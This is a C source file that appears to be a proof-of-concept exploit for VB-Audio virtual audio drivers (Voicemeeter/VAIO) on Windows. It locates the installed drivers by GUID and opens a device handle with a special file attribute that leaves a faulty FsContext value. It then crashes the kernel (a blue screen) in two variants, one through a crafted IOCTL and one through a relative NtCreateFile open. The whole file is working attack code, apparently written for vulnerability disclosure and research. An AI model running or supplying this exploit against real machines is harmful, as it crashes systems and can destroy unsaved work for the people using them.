#include <windows.h>
#include <winternl.h>
#include <SetupAPI.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "SetupAPI.lib")

GUID driver_guids[] = {
    {0x66caa746, 0x1518, 0x4c53, {0xb6, 0xe6, 0x9e, 0x55, 0x0a, 0x73, 0x4f, 0xd1}}, // vbmatrixvaio64*_win10.sys
    {0x3f594749, 0xd668, 0x404a, {0x84, 0xea, 0x50, 0x26, 0xb8, 0x43, 0x77, 0x52}}, // vbvoicemeetervaio64*_win10.sys

    {0x5573cc9c, 0xdf43, 0x40bf, {0x8e, 0xb3, 0xd7, 0x9e, 0x59, 0xa5, 0xa4, 0x81}}, // vbaudio_vmauxvaio*.sys (old vaio driver)
    {0xd8c6b17a, 0x215d, 0x4082, {0x93, 0x41, 0x1e, 0x16, 0x77, 0xae, 0x6b, 0x55}}, // vbaudio_vmvaio*.sys (old vaio driver) 
    {0x7b202778, 0x4862, 0x4b61, {0x86, 0x0e, 0xfa, 0x1e, 0x65, 0x7b, 0xa3, 0xc8}}, // vbaudio_vmvaio3*.sys (old vaio driver)
};

// the driver checks this magic value and sets FsContext to 0x7B for the resulting handle
#define MAGIC_FILE_ATTRIBUTE 0x800 // officially FILE_ATTRIBUTE_COMPRESSED

typedef NTSTATUS (NTAPI*NtCreateFile_t)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

HANDLE init_device_handle();
void exploit_relative_open(HANDLE h_device);
void exploit_ioctl(HANDLE h_device);

int main()
{
    // request the special device handle using MAGIC_FILE_ATTRIBUTE that has the faulty FsContext value associated with it
    HANDLE h_device = init_device_handle();

    if (h_device == INVALID_HANDLE_VALUE)
    {
        printf("init_device_handle error\n");
        return -1;
    }

    //------------------------------
    // variant 1:
    // uses DeviceIoControl with the special device handle and a certain IOCTL code to execute a code path in the MajorFunction[IRP_MJ_DEVICE_CONTROL] handler
    // where the IRP gets passed down to ks.sys via PcDispatchIrp, which dereferences the faulty FsContext value and causes a BSoD
    //------------------------------

    exploit_ioctl(h_device);

    //------------------------------
    // variant 2:
    // uses NtCreateFile to perform a relative open on the special device handle without setting the MAGIC_FILE_ATTRIBUTE again,
    // which causes the MajorFunction[IRP_MJ_CREATE] handler to be called with the FsContext of the original handle, but this time
    // the IRP gets passed down to ks.sys via PcDispatchIrp, which dereferences the faulty FsContext value and causes a BSOD
    //------------------------------

    exploit_relative_open(h_device);

    return 0;
}

HANDLE init_device_handle()
{
    int num_guids = sizeof(driver_guids) / sizeof(GUID);
    HDEVINFO dev_info = INVALID_HANDLE_VALUE;

    //-------------------------------
    // try every driver in the list
    //-------------------------------

    for (int i = 0; i < num_guids; i++)
    {
        //-------------------------------
        // 1. get device path
        //-------------------------------        

        dev_info = SetupDiGetClassDevsA(&driver_guids[i], 0, 0, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);

        if (dev_info == INVALID_HANDLE_VALUE)
            continue;

        SP_DEVICE_INTERFACE_DATA di_data = {0};
        di_data.cbSize = sizeof(di_data);

        if (SetupDiEnumDeviceInterfaces(dev_info, 0, &driver_guids[i], 0, &di_data) == FALSE)
        {
            // driver not installed, try next
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        DWORD required_size;
        SetupDiGetDeviceInterfaceDetailA(dev_info, &di_data, 0, 0, &required_size, 0);

        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            printf("SetupDiGetDeviceInterfaceDetailA error\n");
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        PSP_DEVICE_INTERFACE_DETAIL_DATA_A di_detail = malloc(required_size);

        if (!di_detail)
        {
            printf("malloc error\n");
            SetupDiDestroyDeviceInfoList(dev_info);
            exit(-1);
        }

        di_detail->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_A);

        if (SetupDiGetDeviceInterfaceDetailA(dev_info, &di_data, di_detail, required_size, NULL, 0) == FALSE)
        {
            printf("SetupDiGetDeviceInterfaceDetailA error\n");
            free(di_detail);
            SetupDiDestroyDeviceInfoList(dev_info);
            continue;
        }

        SetupDiDestroyDeviceInfoList(dev_info);

        //-------------------------------------------------------
        // 2. get device handle using magic file attribute value
        //-------------------------------------------------------

        HANDLE h_device = INVALID_HANDLE_VALUE;

        h_device = CreateFileA(
            di_detail->DevicePath,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            MAGIC_FILE_ATTRIBUTE,
            NULL
        );

        if (h_device == INVALID_HANDLE_VALUE)
        {
            printf("CreateFileA error\n");
            continue;
        }

        printf("open device success.\n");
        printf("driver path: %s.\n", di_detail->DevicePath);
        free(di_detail);
        return h_device;
    }

    return INVALID_HANDLE_VALUE;
}

void exploit_ioctl(HANDLE h_device)
{
    //-----------------------------------------------------------------
    // 3. use IOCTL that causes a PcDispatchIrp call, should BSOD here
    //-----------------------------------------------------------------

    DWORD out_buffer = 0;
    DWORD bytes_returned = 0;

    DeviceIoControl(h_device, 0x1337, 0, 0, &out_buffer, sizeof(out_buffer), &bytes_returned, 0);
    CloseHandle(h_device);
}

void exploit_relative_open(HANDLE h_device)
{
    //------------------------------------------------
    // 3. prepare a relative open on the open handle
    //------------------------------------------------

    HANDLE h_ntdll = GetModuleHandleA("ntdll.dll");

    if (!h_ntdll)
    {
        printf("GetModuleHandleA error\n");
        return;
    }

    NtCreateFile_t NtCreateFile = (NtCreateFile_t)(GetProcAddress(h_ntdll, "NtCreateFile"));

    if (!NtCreateFile)
    {
        printf("GetProcAddress error\n");
        return;
    }

    UNICODE_STRING pin_path;
    LPCWSTR relative_path = L"\\pwn";
    OBJECT_ATTRIBUTES obj_attr = {0};

    RtlInitUnicodeString(&pin_path, relative_path);

    InitializeObjectAttributes(
        &obj_attr,
        &pin_path,
        OBJ_CASE_INSENSITIVE,
        h_device, // this handle makes it a relative open
        NULL
    );

    IO_STATUS_BLOCK ioStatus = {0};
    HANDLE h_pin = INVALID_HANDLE_VALUE;

    //-------------------------------------------------------------------
    // 4. perform the relative open on the open handle, should BSOD here
    //-------------------------------------------------------------------

    NTSTATUS status = NtCreateFile(
        &h_pin,
        GENERIC_READ | GENERIC_WRITE,
        &obj_attr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        0,
        NULL,
        0
    );

    if (status != 0)
    {
        printf("NtCreateFile error\n");
        return;
    }

    CloseHandle(h_pin);
    CloseHandle(h_device);
}